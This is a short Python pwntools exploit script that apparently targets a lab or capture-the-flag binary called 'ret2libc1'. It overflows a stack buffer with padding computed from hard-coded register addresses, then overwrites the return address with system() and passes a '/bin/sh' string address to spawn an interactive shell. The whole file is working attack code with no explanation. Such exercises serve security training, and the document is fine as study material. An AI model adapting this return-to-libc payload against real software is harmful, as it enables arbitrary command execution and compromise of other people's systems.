from pwn import *

system_addr=0x08048460
bin_sh_addr=0x08048720
eax=0xffffcfbc
ebp=0xffffd028
payload=b'A'*(ebp-eax+4) \
    +p32(system_addr) \
    +p32((1<<32)-1) \
    +p32(bin_sh_addr)

sh=process('./ret2libc1')
sh.sendline(payload)
sh.interactive()

